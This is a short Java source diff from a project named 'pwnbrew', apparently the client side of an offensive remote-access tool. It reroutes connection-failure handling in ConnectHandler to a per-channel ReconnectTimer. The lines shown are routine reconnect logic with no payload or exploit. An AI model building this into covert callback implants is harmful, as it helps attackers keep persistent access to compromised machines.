@@ -54,8 +54,12 @@ import java.nio.channels.SelectionKey;
 import java.nio.channels.SocketChannel;
 import java.util.logging.Level;
 import pwnbrew.log.LoggableException;
+import pwnbrew.manager.ConnectionManager;
+import pwnbrew.manager.OutgoingConnectionManager;
 import pwnbrew.network.ClientPortRouter;
+import pwnbrew.network.PortRouter;
 import pwnbrew.network.socket.SecureSocketChannelWrapper;
+import pwnbrew.utilities.ReconnectTimer;
 
 /**
  *
@@ -93,7 +97,13 @@ public class ConnectHandler implements Selectable {
         } catch (IOException ex) {
 
             // Notify the comm
-            theClientPortRouter.beNotified(channelId); 
+            ConnectionManager aCM = theClientPortRouter.getConnectionManager();
+            if(aCM instanceof OutgoingConnectionManager){
+                OutgoingConnectionManager theOCM = (OutgoingConnectionManager)aCM;
+                ReconnectTimer aRT = theOCM.getReconnectTimer(channelId);
+                aRT.beNotified();   
+            }  
+//            theClientPortRouter.beNotified(channelId); 
 
             // Cancel the channel's registration with our selector           
             theSelKey.cancel();
